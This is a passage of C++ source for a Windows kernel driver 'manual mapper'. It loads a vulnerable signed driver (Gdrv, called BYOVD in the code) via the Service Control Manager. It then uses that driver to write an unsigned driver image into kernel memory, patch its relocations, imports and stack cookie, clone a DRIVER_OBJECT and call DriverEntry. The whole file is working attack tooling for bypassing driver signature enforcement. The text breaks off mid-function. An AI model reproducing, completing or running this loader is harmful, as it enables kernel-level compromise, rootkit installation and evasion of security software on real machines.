#include "manual_map.h"
#include "kernel_utils.h"
#include "vuln_driver.h"
#include "debug_log.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <cstdint>
#include <string>
#include <vector>
#include <winsvc.h>

namespace
{
    ManualMapper* g_activeMapper = nullptr;

    IMAGE_NT_HEADERS* NtHeaders(uint8_t* base)
    {
        const auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
        return reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    }

    bool FixSecurityCookie(uint8_t* localImage, uint64_t preferredImageBase)
    {
        const auto* nt = NtHeaders(localImage);
        const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
        if (dir.VirtualAddress == 0 || dir.Size == 0)
            return true;
        if (dir.Size < sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))
            return true;
        if (preferredImageBase == 0)
            return true;

        const SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;

        auto* loadConfig = reinterpret_cast<PIMAGE_LOAD_CONFIG_DIRECTORY>(localImage + dir.VirtualAddress);
        if (loadConfig->SecurityCookie == 0)
            return true;

        const uint64_t cookieRva = loadConfig->SecurityCookie - preferredImageBase;
        if (cookieRva > imageSize - sizeof(uint64_t))
            return true;

        uint8_t* stackCookie = localImage + cookieRva;

        constexpr uint64_t kDefaultCookie = 0x2B992DDFA232ULL;
        if (*reinterpret_cast<uint64_t*>(stackCookie) != kDefaultCookie)
        {
            printf("[-] Stack cookie already fixed or unexpected value at 0x%llX\n",
                   static_cast<unsigned long long>(reinterpret_cast<uintptr_t>(stackCookie)));
            return false;
        }

        printf("[+] Fixing stack cookie (rva=0x%llX)\n",
               static_cast<unsigned long long>(cookieRva));
        fflush(stdout);

        uint64_t newCookie = kDefaultCookie ^ GetCurrentProcessId() ^ GetCurrentThreadId();
        if (newCookie == kDefaultCookie)
            newCookie = kDefaultCookie + 1;

        *reinterpret_cast<uint64_t*>(stackCookie) = newCookie;
        return true;
    }
}

ManualMapper::ManualMapper()
    : localImage(nullptr)
    , localImageSize(0)
    , kernelBase(0)
    , preferredImageBase(0)
    , entryPointRva(0)
    , vulnType(VulnDriverType::Gdrv)
    , loaded(false)
{
}

ManualMapper::~ManualMapper()
{
    if (loaded)
        UnloadDriver();
    Cleanup();
}

bool ManualMapper::OpenDriverFile(const wchar_t* sysPath)
{
    HANDLE hFile = CreateFileW(sysPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open driver file: %ls (error %lu)\n", sysPath, GetLastError());
        return false;
    }

    LARGE_INTEGER fileSize{};
    if (!GetFileSizeEx(hFile, &fileSize))
    {
        CloseHandle(hFile);
        return false;
    }

    localImageSize = static_cast<SIZE_T>(fileSize.QuadPart);
    localImage = static_cast<uint8_t*>(malloc(localImageSize));
    if (!localImage)
    {
        CloseHandle(hFile);
        return false;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, localImage, static_cast<DWORD>(localImageSize), &bytesRead, nullptr) || bytesRead != localImageSize)
    {
        free(localImage);
        localImage = nullptr;
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);
    return true;
}

bool ManualMapper::ParsePEHeaders()
{
    const auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(localImage);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return false;

    const auto* nt = NtHeaders(localImage);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return false;

    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        printf("[-] Driver must be x64.\n");
        return false;
    }

    preferredImageBase = nt->OptionalHeader.ImageBase;
    entryPointRva = nt->OptionalHeader.AddressOfEntryPoint;
    return true;
}

bool ManualMapper::BuildLocalImage()
{
    const auto* nt = NtHeaders(localImage);
    const SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;

    uint8_t* image = static_cast<uint8_t*>(calloc(1, imageSize));
    if (!image)
        return false;

    memcpy(image, localImage, nt->OptionalHeader.SizeOfHeaders);

    const auto* section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++section)
    {
        if (section->SizeOfRawData == 0)
            continue;
        memcpy(image + section->VirtualAddress,
               localImage + section->PointerToRawData,
               section->SizeOfRawData);
    }

    free(localImage);
    localImage = image;
    localImageSize = imageSize;
    return true;
}

bool ManualMapper::ProcessImportTable()
{
    const auto* nt = NtHeaders(localImage);
    const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (dir.VirtualAddress == 0)
        return true;

    auto* importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(localImage + dir.VirtualAddress);

    for (; importDesc->Name; ++importDesc)
    {
        const char* moduleName = reinterpret_cast<const char*>(localImage + importDesc->Name);
        auto* thunk = reinterpret_cast<IMAGE_THUNK_DATA64*>(localImage + importDesc->FirstThunk);
        auto* orig = reinterpret_cast<IMAGE_THUNK_DATA64*>(
            localImage + (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));

        for (; orig->u1.AddressOfData; ++orig, ++thunk)
        {
            uint64_t function = 0;
            if (IMAGE_SNAP_BY_ORDINAL64(orig->u1.Ordinal))
            {
                printf("[-] Ordinal imports are not supported (%s)\n", moduleName);
                return false;
            }

            const auto* importByName = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(localImage + orig->u1.AddressOfData);
            function = GetKernelExport(moduleName, importByName->Name);
            if (!function)
            {
                printf("[-] Failed to resolve import %s!%s\n", moduleName, importByName->Name);
                return false;
            }

            thunk->u1.Function = function;
        }
    }

    return true;
}

bool ManualMapper::ApplyRelocations()
{
    auto* nt = NtHeaders(localImage);
    const ULONG_PTR delta = static_cast<ULONG_PTR>(kernelBase - nt->OptionalHeader.ImageBase);
    nt->OptionalHeader.ImageBase = kernelBase;

    const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (dir.VirtualAddress == 0 || dir.Size == 0 || delta == 0)
        return true;

    auto* reloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(localImage + dir.VirtualAddress);
    const auto* relocEnd = reinterpret_cast<const uint8_t*>(reloc) + dir.Size;

    while (reinterpret_cast<const uint8_t*>(reloc) < relocEnd && reloc->SizeOfBlock)
    {
        const uint32_t count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        auto* entry = reinterpret_cast<WORD*>(reinterpret_cast<uint8_t*>(reloc) + sizeof(IMAGE_BASE_RELOCATION));

        for (uint32_t i = 0; i < count; ++i, ++entry)
        {
            const WORD type = *entry >> 12;
            const WORD offset = *entry & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64)
            {
                auto* patch = reinterpret_cast<uint64_t*>(localImage + reloc->VirtualAddress + offset);
                *patch += delta;
            }
            else if (type == IMAGE_REL_BASED_HIGHLOW)
            {
                auto* patch = reinterpret_cast<uint32_t*>(localImage + reloc->VirtualAddress + offset);
                *patch += static_cast<uint32_t>(delta);
            }
        }

        reloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock);
    }

    return true;
}

bool ManualMapper::ResolveImports()
{
    return ProcessImportTable();
}

bool ManualMapper::AllocateKernelMemory(KernelAllocMode allocMode)
{
    const auto* nt = NtHeaders(localImage);
    const uint32_t size = nt->OptionalHeader.SizeOfImage;

    const char* modeLabel = (allocMode == KernelAllocMode::IndependentPages)
                                ? "IndependentPages"
                                : "Pool";

    printf("[*] Phase B: allocating kernel memory (mode=%s, size=0x%X)\n", modeLabel, size);
    fflush(stdout);
    {
        char dataJson[96];
        sprintf_s(dataJson, "{\"mode\":\"%s\",\"size\":%u}", modeLabel, size);
        AgentDebugLog("F", "manual_map.cpp:AllocateKernelMemory", "map_step_alloc_start", dataJson);
    }

    std::string allocError;
    kernelBase = KernelAllocateMemory(size, allocMode, 0x4D767244, &allocError);
    if (kernelBase == 0)
    {
        if (!allocError.empty())
            printf("[-] Kernel memory allocation failed: %s\n", allocError.c_str());
        else
            printf("[-] Kernel memory allocation failed (unknown reason).\n");
        fflush(stdout);
        AgentDebugLog("F", "manual_map.cpp:AllocateKernelMemory", "map_step_alloc_failed", "{}");
        return false;
    }

    printf("[+] Kernel memory allocated at 0x%llX (mode=%s, size 0x%X)\n",
           static_cast<unsigned long long>(kernelBase), modeLabel, size);
    fflush(stdout);
    AgentDebugLog("F", "manual_map.cpp:AllocateKernelMemory", "map_step_alloc_ok", "{}");
    return true;
}

bool ManualMapper::WriteDriverImage()
{
    const auto* nt = NtHeaders(localImage);
    return VulnWriteKernelMemory(kernelBase, localImage, nt->OptionalHeader.SizeOfImage);
}

bool ManualMapper::CallDriverEntry()
{
    if (kernelBase == 0 || entryPointRva == 0)
    {
        printf("[-] Invalid mapped image state (base=0x%llX entry=0x%llX).\n",
               static_cast<unsigned long long>(kernelBase),
               static_cast<unsigned long long>(entryPointRva));
        return false;
    }

    // IoCreateDevice requires a real I/O manager DRIVER_OBJECT with a valid DriverExtension.
    // Clone the loaded BYOVD driver's object instead of fabricating Type/Size only.
    const auto& vulnInfo = GetVulnDriverInfo(vulnType);
    const wchar_t* alternateName =
        (vulnType == VulnDriverType::Gdrv) ? L"\\Driver\\Gdrv" : nullptr;

    std::string cloneError;
    const uint64_t driverObject =
        CloneKernelDriverObject(vulnInfo.driverObjectName, alternateName, &cloneError);
    if (driverObject == 0)
    {
        printf("[-] Failed to clone DRIVER_OBJECT from BYOVD: %s\n",
               cloneError.empty() ? "unknown" : cloneError.c_str());
        return false;
    }

    const uint64_t entryPoint = kernelBase + entryPointRva;
    printf("[+] Calling DriverEntry at 0x%llX (DriverObject=0x%llX)\n",
           static_cast<unsigned long long>(entryPoint),
           static_cast<unsigned long long>(driverObject));

    std::string callError;
    const int32_t status = KernelCall2(entryPoint, driverObject, 0, &callError);
    if (status < 0)
    {
        if (!callError.empty())
            printf("[-] DriverEntry shellcode: %s\n", callError.c_str());
        printf("[-] DriverEntry returned NTSTATUS 0x%08X\n", status);
        return false;
    }

    printf("[+] DriverEntry returned STATUS_SUCCESS\n");
    return true;
}

void ManualMapper::Cleanup()
{
    if (localImage)
    {
        free(localImage);
        localImage = nullptr;
    }
    localImageSize = 0;
    kernelBase = 0;
}

bool ManualMapper::UnloadDriver()
{
    loaded = false;
    kernelBase = 0;
    VulnDriverUnload();
    return true;
}

bool ManualMapper::LoadDriver(const wchar_t* sysPath, VulnDriverType type, KernelAllocMode allocMode,
                                std::wstring* errorOut)
{
    auto fail = [&](const wchar_t* msg) -> bool
    {
        if (errorOut) errorOut->assign(msg);
        printf("[-] %ls\n", msg);
        return false;
    };

    vulnType = type;

    std::string precacheError;
    if (!PreCacheNtoskrnlExports(&precacheError))
    {
        printf("[-] %s\n", precacheError.c_str());
        wchar_t buf[512]{};
        MultiByteToWideChar(CP_ACP, 0, precacheError.c_str(), -1, buf, 512);
        return fail(buf);
    }

    printf("[*] Loading BYOVD (%ls) via SCM...\n", VulnDriverDefaultPath(type).c_str());
    fflush(stdout);
    AgentDebugLog("F", "manual_map.cpp:LoadDriver", "map_step_before_byovd", "{}");

    std::wstring err;
    if (!VulnDriverLoad(type, VulnDriverDefaultPath(type).c_str(), &err))
    {
        AgentDebugLog("F", "manual_map.cpp:LoadDriver", "map_step_byovd_failed", "{}");
        return fail(err.c_str());
    }

    printf("[+] BYOVD loaded: %ls (%ls)\n",
           VulnDriverTypeName(type), VulnDriverLoadedPath().c_str());
    fflush(stdout);
    AgentDebugLog("F", "manual_map.cpp:LoadDriver", "map_step_byovd_done", "{}");

    printf("[*] Phase A: opening target driver file...\n");
    fflush(stdout);
    AgentDebugLog("F", "manual_map.cpp:LoadDriver", "map_step_phase_a_start", "{}");

    if (!OpenDriverFile(sysPath))
    {
        VulnDriverUnload();
        wchar_t buf[512];
        swprintf_s(buf, L"Failed to open target driver: %ls (error %lu)", sysPath, GetLastError());
        return fail(buf);
    }
    printf("[*] Target driver opened: %ls (0x%zX bytes)\n", sysPath, localImageSize);
    fflush(stdout);
    AgentDebugLog("F", "manual_map.cpp:LoadDriver", "map_step_open_file_ok", "{}");

    if (!ParsePEHeaders())
    {
        Cleanup();
        VulnDriverUnload();
        return fail(L"Invalid PE image or unsupported driver format.");
    }
    printf("[*] Target driver PE parsed (entry RVA=0x%X)\n", entryPointRva);
    fflush(stdout);

    if (!BuildLocalImage())
    {
        Cleanup();
        VulnDriverUnload();
        return fail(L"Invalid PE image or unsupported driver format.");
    }
    printf("[*] Target driver local image built (SizeOfImage=0x%zX)\n", localImageSize);
    fflush(stdout);

    printf("[*] Target driver parsed (SizeOfImage=0x%X), allocating kernel memory...\n",
           NtHeaders(localImage)->OptionalHeader.SizeOfImage);
    fflush(stdout);
    AgentDebugLog("F", "manual_map.cpp:LoadDriver", "map_step_before_alloc", "{}");

    if (!AllocateKernelMemory(allocMode))
    {
        Cleanup();
        VulnDriverUnload();
        wchar_t buf[768];
        swprintf_s(buf, L"Kernel memory allocation failed. See console for details "
                        L"(NtAddAtom hook / ExAllocatePool2 / ExAllocatePoolWithTag / MmAllocateIndependentPagesEx).");
        return fail(buf);
    }

    if (!ApplyRelocations())
    {
        Cleanup();
        VulnDriverUnload();
        return fail(L"Failed to apply base relocations.");
    }

    if (!FixSecurityCookie(localImage, preferredImageBase))
    {
        Cleanup();
        VulnDriverUnload();
        return fail(L"Failed to fix /GS stack cookie.");
    }

    if (!ResolveImports())
    {
        Cleanup();
        VulnDriverUnload();
        return fail(L"Failed to resolve one or more kernel imports.");
    }

    if (!WriteDriverImage())
    {
        Cleanup();
        VulnDriverUnload();
        return fail(L"Failed to write driver image into kernel memory.");
    }

    if (!CallDriverEntry())
    {
        Cleanup();
        VulnDriverUnload();
        return fail(L"DriverEntry returned failure (see console for NTSTATUS).");
    }

    loaded = true;
    VulnDriverUnload();
    printf("[+] Driver manually mapped at 0x%llX\n", static_cast<unsigned long long>(kernelBase));
    return true;
}

bool ManualMapDriver(const wchar_t* sysPath, VulnDriverType vulnType,
                       KernelAllocMode allocMode, std::wstring* errorOut)
{
    if (g_activeMapper)
        UnloadManualMapDriver();

    g_activeMapper = new ManualMapper();
    if (!g_activeMapper->LoadDriver(sysPath, vulnType, allocMode, errorOut))
    {
        if (errorOut && errorOut->empty())
            errorOut->assign(L"Manual mapping failed.");
        delete g_activeMapper;
        g_activeMapper = nullptr;
        return false;
    }

    return true;
}

bool UnloadManualMapDriver()
{
    if (!g_activeMapper)
        return true;

    g_activeMapper->UnloadDriver();
    delete g_activeMapper;
    g_activeMapper = nullptr;
    return true;
}

bool IsManualMapDriverLoaded()
{
    return g_activeMapper != nullptr;
}

static void SetOptionalWideError(std::wstring* errorOut, const wchar_t* msg)
{
    if (errorOut)
        errorOut->assign(msg);
}

static bool WaitForServiceState(SC_HANDLE svc, DWORD wantState, DWORD timeoutMs,
                                SERVICE_STATUS_PROCESS* outSsp)
{
    SERVICE_STATUS_PROCESS ssp{};
    DWORD needed = 0;
    const DWORD start = GetTickCount();
    while (true)
    {
        if (!QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO,
                                  reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &needed))
        {
            if (outSsp)
                *outSsp = ssp;
            return false;
        }
        if (outSsp)
            *outSsp = ssp;
        if (ssp.dwCurrentState == wantState)
            return true;
        if (GetTickCount() - start >= timeoutMs)
            return false;
        Sleep(50);
    }
}

static void FormatScmLoadError(DWORD startErr, const SERVICE_STATUS_PROCESS& ssp,
                               wchar_t* buf, size_t cch)
{
    const DWORD code = (ssp.dwWin32ExitCode != 0 && ssp.dwWin32ExitCode != NO_ERROR)
        ? ssp.dwWin32ExitCode
        : startErr;

    if (code == ERROR_INVALID_IMAGE_HASH || startErr == ERROR_INVALID_IMAGE_HASH)
    {
        swprintf_s(buf, cch,
            L"[-] SCM load failed: unsigned or untrusted driver image "
            L"(Win32 577 ERROR_INVALID_IMAGE_HASH). Sign MyMemoryDriver.sys with "
            L"build.ps1 or scripts\\sign_driver.ps1, then enable test signing: "
            L"bcdedit /set testsigning on (reboot required). A Test Mode watermark "
            L"does not load an unsigned .sys. serviceState=%lu win32Exit=%lu startErr=%lu",
            ssp.dwCurrentState, ssp.dwWin32ExitCode, startErr);
        return;
    }

    if (code == ERROR_SERVICE_MARKED_FOR_DELETE || startErr == ERROR_SERVICE_MARKED_FOR_DELETE)
    {
        swprintf_s(buf, cch,
            L"[-] SCM: service is marked for deletion (Win32 1072). "
            L"A leftover ImagePath is still registered. Reboot, then load the requested .sys. "
            L"Do not StartService on the leftover binary. serviceState=%lu win32Exit=%lu startErr=%lu",
            ssp.dwCurrentState, ssp.dwWin32ExitCode, startErr);
        return;
    }

    swprintf_s(buf, cch,
        L"[-] SCM load failed (StartService Win32=%lu, serviceState=%lu, win32Exit=%lu, serviceExit=%lu).",
        startErr, ssp.dwCurrentState, ssp.dwWin32ExitCode, ssp.dwServiceSpecificExitCode);
}

static std::wstring CanonicalizeSysPath(const wchar_t* path)
{
    if (!path || !path[0])
        return {};

    std::wstring s(path);
    while (!s.empty() && (s.front() == L'"' || s.front() == L'\''))
        s.erase(s.begin());
    while (!s.empty() && (s.back() == L'"' || s.back() == L'\''))
        s.pop_back();

    if (s.rfind(L"\\??\\", 0) == 0)
        s.erase(0, 4);
    else if (s.rfind(L"\\\\?\\", 0) == 0)
        s.erase(0, 4);

    for (auto& ch : s)
    {
        if (ch == L'/')
            ch = L'\\';
    }

    wchar_t full[MAX_PATH]{};
    const DWORD n = GetFullPathNameW(s.c_str(), MAX_PATH, full, nullptr);
    if (n == 0 || n >= MAX_PATH)
        return s;
    return full;
}

static bool GetFileSizeAndHash(const wchar_t* path, ULONGLONG* outSize, ULONGLONG* outHash)
{
    if (outSize)
        *outSize = 0;
    if (outHash)
        *outHash = 0;
    if (!path || !path[0])
        return false;

    HANDLE h = CreateFileW(path, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        return false;

    LARGE_INTEGER sz{};
    if (!GetFileSizeEx(h, &sz) || sz.QuadPart < 0)
    {
        CloseHandle(h);
        return false;
    }

    constexpr ULONGLONG kOffset = 14695981039346656037ULL;
    constexpr ULONGLONG kPrime = 1099511628211ULL;
    ULONGLONG hash = kOffset;
    uint8_t buf[4096];
    DWORD read = 0;
    BOOL ok = TRUE;
    while ((ok = ReadFile(h, buf, sizeof(buf), &read, nullptr)) == TRUE && read > 0)
    {
        for (DWORD i = 0; i < read; ++i)
        {
            hash ^= buf[i];
            hash *= kPrime;
        }
    }
    CloseHandle(h);
    if (!ok)
        return false;

    if (outSize)
        *outSize = static_cast<ULONGLONG>(sz.QuadPart);
    if (outHash)
        *outHash = hash;
    return true;
}

static bool QueryServiceImagePath(SC_HANDLE svc, std::wstring* imagePath)
{
    if (!svc || !imagePath)
        return false;
    imagePath->clear();

    DWORD needed = 0;
    QueryServiceConfigW(svc, nullptr, 0, &needed);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || needed == 0)
        return false;

    std::vector<uint8_t> buf(needed);
    auto* cfg = reinterpret_cast<QUERY_SERVICE_CONFIGW*>(buf.data());
    if (!QueryServiceConfigW(svc, cfg, needed, &needed) || !cfg->lpBinaryPathName)
        return false;

    *imagePath = cfg->lpBinaryPathName;
    return true;
}

static bool PathsEqualCanonical(const std::wstring& a, const std::wstring& b)
{
    return !a.empty() && !b.empty() && _wcsicmp(a.c_str(), b.c_str()) == 0;
}

static bool StopServiceFully(SC_HANDLE svc, DWORD timeoutMs)
{
    SERVICE_STATUS st{};
    ControlService(svc, SERVICE_CONTROL_STOP, &st);
    SERVICE_STATUS_PROCESS ssp{};
    if (WaitForServiceState(svc, SERVICE_STOPPED, timeoutMs, &ssp))
        return true;
    return ssp.dwCurrentState == SERVICE_STOPPED;
}

static void FormatMarkedForDeletionError(std::wstring* errorOut, const wchar_t* serviceName)
{
    wchar_t buf[512];
    swprintf_s(buf,
        L"[-] SCM: service '%ls' is marked for deletion (Win32 1072). "
        L"The leftover ImagePath cannot be replaced until the SCM finishes deleting it. "
        L"Reboot required (or wait until sc.exe qc shows the service is gone), then load again. "
        L"Refusing to StartService on the leftover binary.",
        serviceName);
    printf("%ls\n", buf);
    fflush(stdout);
    SetOptionalWideError(errorOut, buf);
}

bool DriverServiceExists(const wchar_t* serviceName)
{
    if (!serviceName)
        return false;

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm)
        return false;

    SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_STATUS);
    const bool exists = (svc != nullptr);
    if (svc)
        CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return exists;
}

static SC_HANDLE CreateKernelDriverService(SC_HANDLE scm, const wchar_t* serviceName,
                                           const wchar_t* binPath, DWORD* outErr)
{
    SC_HANDLE svc = CreateServiceW(
        scm, serviceName, serviceName,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        binPath, nullptr, nullptr, nullptr, nullptr, nullptr);
    if (outErr)
        *outErr = svc ? 0 : GetLastError();
    return svc;
}

static bool BindExistingServiceToPath(SC_HANDLE svc, const wchar_t* serviceName,
                                      const std::wstring& requestedCanon,
                                      ULONGLONG reqSize, ULONGLONG reqHash,
                                      bool* reuseHandle,
                                      std::wstring* errorOut)
{
    if (reuseHandle)
        *reuseHandle = false;

    std::wstring imagePath;
    if (!QueryServiceImagePath(svc, &imagePath))
    {
        wchar_t buf[256];
        swprintf_s(buf, L"[-] SCM: QueryServiceConfig ImagePath failed Win32=%lu", GetLastError());
        printf("%ls\n", buf);
        fflush(stdout);
        SetOptionalWideError(errorOut, buf);
        return false;
    }

    const std::wstring existingCanon = CanonicalizeSysPath(imagePath.c_str());
    ULONGLONG existSize = 0;
    ULONGLONG existHash = 0;
    const bool existHasFile = GetFileSizeAndHash(existingCanon.c_str(), &existSize, &existHash);
    printf("[*] SCM: existing ImagePath=\"%ls\" (canonical=\"%ls\") size=%llu hash=0x%llx fileOk=%d\n",
           imagePath.c_str(), existingCanon.c_str(),
           static_cast<unsigned long long>(existSize),
           static_cast<unsigned long long>(existHash),
           existHasFile ? 1 : 0);
    fflush(stdout);

    SERVICE_STATUS_PROCESS ssp{};
    DWORD needed = 0;
    QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO,
                         reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &needed);

    const bool samePath = PathsEqualCanonical(existingCanon, requestedCanon);
    const bool sameBinary = samePath && existHasFile && existSize == reqSize && existHash == reqHash;

    if (sameBinary)
    {
        printf("[*] SCM: existing service already bound to requested binary.\n");
        fflush(stdout);
        if (reuseHandle)
            *reuseHandle = true;
        return true;
    }

    printf("[*] SCM: leftover service mismatch (pathEqual=%d sizeEqual=%d). "
           "STOP+DELETE, will not StartService on leftover ImagePath.\n",
           samePath ? 1 : 0, (existHasFile && existSize == reqSize) ? 1 : 0);
    fflush(stdout);

    if (ssp.dwCurrentState != SERVICE_STOPPED)
    {
        if (!StopServiceFully(svc, 10000))
        {
            wchar_t buf[512];
            swprintf_s(buf,
                L"[-] SCM: could not stop leftover service '%ls' (state=%lu, ImagePath=\"%ls\"). "
                L"Refusing to StartService on that ImagePath.",
                serviceName, ssp.dwCurrentState, imagePath.c_str());
            printf("%ls\n", buf);
            fflush(stdout);
            SetOptionalWideError(errorOut, buf);
            return false;
        }
    }

    if (!DeleteService(svc))
    {
        const DWORD delErr = GetLastError();
        if (delErr == ERROR_SERVICE_MARKED_FOR_DELETE)
        {
            FormatMarkedForDeletionError(errorOut, serviceName);
            return false;
        }
        wchar_t buf[256];
        swprintf_s(buf, L"[-] SCM: DeleteService leftover failed Win32=%lu", delErr);
        printf("%ls\n", buf);
        fflush(stdout);
        SetOptionalWideError(errorOut, buf);
        return false;
    }

    printf("[*] SCM: leftover service deleted; recreating with requested ImagePath.\n");
    fflush(stdout);
    return true;
}

bool LoadDriverViaService(const wchar_t* sysPath, const wchar_t* serviceName, std::wstring* errorOut)
{
    if (!sysPath || !serviceName)
        return false;

    const std::wstring requestedCanon = CanonicalizeSysPath(sysPath);
    ULONGLONG reqSize = 0;
    ULONGLONG reqHash = 0;
    if (requestedCanon.empty() || !GetFileSizeAndHash(requestedCanon.c_str(), &reqSize, &reqHash))
    {
        wchar_t buf[512];
        swprintf_s(buf, L"[-] SCM: requested driver not readable: \"%ls\" Win32=%lu",
                   requestedCanon.empty() ? sysPath : requestedCanon.c_str(), GetLastError());
        printf("%ls\n", buf);
        fflush(stdout);
        SetOptionalWideError(errorOut, buf);
        return false;
    }

    printf("[*] SCM: requested ImagePath=\"%ls\" size=%llu hash=0x%llx service=%ls\n",
           requestedCanon.c_str(),
           static_cast<unsigned long long>(reqSize),
           static_cast<unsigned long long>(reqHash),
           serviceName);
    fflush(stdout);

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm)
    {
        const DWORD err = GetLastError();
        wchar_t buf[512];
        swprintf_s(buf, L"[-] SCM: OpenSCManager failed Win32=%lu (run as Administrator).", err);
        printf("%ls\n", buf);
        fflush(stdout);
        SetOptionalWideError(errorOut, buf);
        return false;
    }

    SC_HANDLE svc = OpenServiceW(scm, serviceName,
        SERVICE_ALL_ACCESS);

    if (svc)
    {
        bool reuseHandle = false;
        if (!BindExistingServiceToPath(svc, serviceName, requestedCanon, reqSize, reqHash,
                                       &reuseHandle, errorOut))
        {
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return false;
        }

        if (!reuseHandle)
        {
            CloseServiceHandle(svc);
            svc = nullptr;
            Sleep(200);
        }
    }

    if (!svc)
    {
        DWORD createErr = 0;
        for (int attempt = 0; attempt < 40 && !svc; ++attempt)
        {
            svc = CreateKernelDriverService(scm, serviceName, requestedCanon.c_str(), &createErr);
            if (svc)
                break;

            if (createErr == ERROR_SERVICE_MARKED_FOR_DELETE)
            {
                if (attempt == 0)
                {
                    printf("[*] SCM: CreateService Win32=1072 (marked for deletion); waiting to retry...\n");
                    fflush(stdout);
                }
                Sleep(250);
                continue;
            }
            break;
        }

        if (!svc && createErr == ERROR_SERVICE_MARKED_FOR_DELETE)
        {
            FormatMarkedForDeletionError(errorOut, serviceName);
            CloseServiceHandle(scm);
            return false;
        }

        if (!svc && createErr == ERROR_SERVICE_EXISTS)
        {
            svc = OpenServiceW(scm, serviceName, SERVICE_ALL_ACCESS);
            if (!svc)
            {
                wchar_t buf[256];
                swprintf_s(buf, L"[-] SCM: CreateService/OpenService failed Win32=%lu", createErr);
                printf("%ls\n", buf);
                fflush(stdout);
                SetOptionalWideError(errorOut, buf);
                CloseServiceHandle(scm);
                return false;
            }

            std::wstring existPath;
            QueryServiceImagePath(svc, &existPath);
            const std::wstring existCanon = CanonicalizeSysPath(existPath.c_str());
            if (!PathsEqualCanonical(existCanon, requestedCanon))
            {
                SERVICE_STATUS_PROCESS ssp{};
                DWORD needed = 0;
                QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO,
                                     reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &needed);
                if (ssp.dwCurrentState != SERVICE_STOPPED)
                {
                    if (!StopServiceFully(svc, 10000))
                    {
                        wchar_t buf[512];
                        swprintf_s(buf,
                            L"[-] SCM: service exists with leftover ImagePath=\"%ls\"; could not stop it. "
                            L"Refusing StartService / ChangeServiceConfig while it is running.",
                            existPath.c_str());
                        printf("%ls\n", buf);
                        fflush(stdout);
                        SetOptionalWideError(errorOut, buf);
                        CloseServiceHandle(svc);
                        CloseServiceHandle(scm);
                        return false;
                    }
                }

                printf("[*] SCM: ChangeServiceConfig ImagePath \"%ls\" -> \"%ls\"\n",
                       existPath.c_str(), requestedCanon.c_str());
                fflush(stdout);
                if (!ChangeServiceConfigW(svc, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                                          SERVICE_ERROR_NORMAL, requestedCanon.c_str(),
                                          nullptr, nullptr, nullptr, nullptr, nullptr, nullptr))
                {
                    const DWORD cfgErr = GetLastError();
                    if (cfgErr == ERROR_SERVICE_MARKED_FOR_DELETE)
                    {
                        FormatMarkedForDeletionError(errorOut, serviceName);
                        CloseServiceHandle(svc);
                        CloseServiceHandle(scm);
                        return false;
                    }
                    wchar_t buf[512];
                    swprintf_s(buf,
                        L"[-] SCM: ChangeServiceConfig to \"%ls\" failed Win32=%lu. "
                        L"Refusing to StartService on leftover ImagePath=\"%ls\".",
                        requestedCanon.c_str(), cfgErr, existPath.c_str());
                    printf("%ls\n", buf);
                    fflush(stdout);
                    SetOptionalWideError(errorOut, buf);
                    CloseServiceHandle(svc);
                    CloseServiceHandle(scm);
                    return false;
                }
            }
        }
        else if (!svc)
        {
            wchar_t buf[256];
            swprintf_s(buf, L"[-] SCM: CreateService failed Win32=%lu", createErr);
            printf("%ls\n", buf);
            fflush(stdout);
            SetOptionalWideError(errorOut, buf);
            CloseServiceHandle(scm);
            return false;
        }
    }

    std::wstring boundPath;
    QueryServiceImagePath(svc, &boundPath);
    const std::wstring boundCanon = CanonicalizeSysPath(boundPath.c_str());
    if (!PathsEqualCanonical(boundCanon, requestedCanon))
